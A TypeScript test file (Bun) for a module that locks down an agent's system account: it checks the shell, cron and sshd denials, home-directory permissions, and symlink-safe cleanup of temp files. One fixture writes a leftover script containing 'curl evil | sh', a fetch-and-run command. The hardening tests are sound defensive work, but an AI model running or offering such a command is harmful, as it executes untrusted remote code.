import { afterEach, expect, test } from "bun:test";
import { existsSync } from "node:fs";
import { chmod, mkdir, mkdtemp, readFile, rm, symlink } from "node:fs/promises";
import { tmpdir, userInfo } from "node:os";
import { join } from "node:path";
import { SystemAgentAccount, sshdAllows } from "./account";

let dir: string | null = null;
afterEach(async () => {
  if (dir !== null) await rm(dir, { recursive: true, force: true });
  dir = null;
});

const accountWithShell = async (shell: string) => {
  dir = await mkdtemp(join(tmpdir(), "omp-app-account-"));
  const passwd = join(dir, "passwd");
  await Bun.write(passwd, `omp-agent:x:990:990::${join(dir, "home")}:${shell}\n`);
  return new SystemAgentAccount({
    account: "omp-agent",
    home: join(dir, "home"),
    inHome: [],
    passwd,
  });
};

test("sessions start only when the agent account's shell is dash: bash reads ~/.bashrc before the wrapper under sshd (#20)", async () => {
  expect(await (await accountWithShell("/bin/sh")).problem()).toBeNull();
  expect(await (await accountWithShell("/bin/bash")).problem()).toContain(
    "usermod --shell /bin/sh omp-agent",
  );
});

test("a turn-on is refused while the person's home is open to other accounts, cron does not deny the account, or the computer's own sshd would let it in (audit 2 F10)", async () => {
  dir = await mkdtemp(join(tmpdir(), "omp-app-account-"));
  const passwd = join(dir, "passwd");
  const personHome = join(dir, "person");
  const cronDeny = join(dir, "cron.deny");
  await mkdir(personHome, { mode: 0o755 });
  await chmod(personHome, 0o755);
  await Bun.write(passwd, `omp-agent:x:990:990::${join(dir, "home")}:/bin/sh\n`);
  await Bun.write(cronDeny, "omp-agent\n");
  let sshd: string | null = null;
  const account = new SystemAgentAccount({
    account: "omp-agent",
    home: join(dir, "home"),
    inHome: [],
    passwd,
    personHome,
    cronDeny,
    systemSshd: async () => sshd,
  });
  expect(await account.problem()).toContain(`chmod 750 ${personHome}`);
  await chmod(personHome, 0o750);
  expect(await account.problem()).toBeNull();
  if (Bun.which("crontab") !== null) {
    await Bun.write(cronDeny, "someone-else\n");
    expect(await account.problem()).toContain("may schedule jobs with cron");
    await Bun.write(cronDeny, "omp-agent\n");
    // A cron.allow that does not list the account keeps it out too, whatever cron.deny says.
    const cronAllow = join(dir, "cron.allow");
    await Bun.write(cronDeny, "");
    await Bun.write(cronAllow, "bob\n");
    expect(await account.problem()).toBeNull();
    await Bun.write(cronAllow, "bob\nomp-agent\n");
    expect(await account.problem()).toContain("may schedule jobs with cron");
    await rm(cronAllow);
    await Bun.write(cronDeny, "omp-agent\n");
  }
  sshd = "this computer's own ssh server is running and lets omp-agent log in";
  expect(await account.problem()).toBe(sshd);
});

test("sshd's printed settings: DenyUsers or an AllowUsers without the account keep it out (audit 2 F10)", () => {
  const settings = (extra: string) => `port 22\npermitrootlogin without-password\n${extra}`;
  expect(sshdAllows(settings(""), "omp-agent")).toBe(true);
  expect(sshdAllows(settings("denyusers omp-agent\n"), "omp-agent")).toBe(false);
  expect(sshdAllows(settings("denyusers bob omp-agent\n"), "omp-agent")).toBe(false);
  expect(sshdAllows(settings("allowusers alice\n"), "omp-agent")).toBe(false);
  expect(sshdAllows(settings("allowusers alice omp-agent\n"), "omp-agent")).toBe(true);
  expect(sshdAllows(settings("denyusers omp-agent-old\n"), "omp-agent")).toBe(true);
});

test("a reset removes what the account left in the shared temporary folders, never following its links (#20)", async () => {
  dir = await mkdtemp(join(tmpdir(), "omp-app-account-"));
  const temp = join(dir, "tmp");
  const outside = join(dir, "outside.txt");
  await Bun.write(outside, "the person's own\n");
  await mkdir(join(temp, "omp-access-x"), { recursive: true });
  await Bun.write(join(temp, "agent-left.sh"), "curl evil | sh\n");
  await Bun.write(join(temp, "omp-access-x", "terminal"), "");
  await symlink(outside, join(temp, "link-out"));
  const me = userInfo().username;
  const account = new SystemAgentAccount({
    account: me,
    home: join(dir, "home"),
    inHome: [],
    tempFolders: [temp],
    // The real commands, but none that ends processes: the account here is the test's own.
    run: async (argv) =>
      ["pkill", "pgrep", "crontab", "atq", "atrm", "loginctl"].includes(argv[0] ?? "")
        ? 1
        : Bun.spawn([...argv], { stdout: "ignore", stderr: "ignore" }).exited,
  });
  expect(await account.reset()).toEqual([`files of ${me} in ${temp}`]);
  expect(existsSync(join(temp, "agent-left.sh"))).toBe(false);
  expect(existsSync(join(temp, "omp-access-x"))).toBe(false);
  expect(existsSync(join(temp, "link-out"))).toBe(false);
  expect(await readFile(outside, "utf8")).toBe("the person's own\n");
  // Nothing left: the next reset reports nothing.
  expect(await account.reset()).toEqual([]);
});
